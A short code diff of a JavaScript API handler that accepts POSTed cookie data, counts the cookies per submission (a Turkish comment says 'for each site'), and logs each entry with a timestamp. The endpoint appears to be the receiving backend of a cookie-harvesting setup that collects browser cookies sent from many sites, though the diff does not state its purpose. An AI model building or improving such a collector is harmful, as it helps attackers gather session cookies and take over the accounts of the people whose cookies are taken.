@@ -1,5 +1,4 @@
 let posts = [];
-let cookieCount = 0;
 
 export default function handler(req, res) {
   if (req.method === 'POST') {
@@ -11,15 +10,16 @@ export default function handler(req, res) {
       } catch {}
     }
 
-    // Check if the request contains cookie data and increment counter
-    if (body && body.cookies) {
-      cookieCount++;
+    // Her site için cookie sayısını hesapla
+    let cookieCount = 0;
+    if (body && body.cookies && Array.isArray(body.cookies)) {
+      cookieCount = body.cookies.length;
     }
 
     const data = {
       time: new Date().toISOString(),
-      body,
-      totalCookies: cookieCount
+      cookieCount: cookieCount, // Sitenin cookie sayısı
+      body
     };
     posts.unshift(data);
     res.status(200).json({ status: 'ok', received: data });
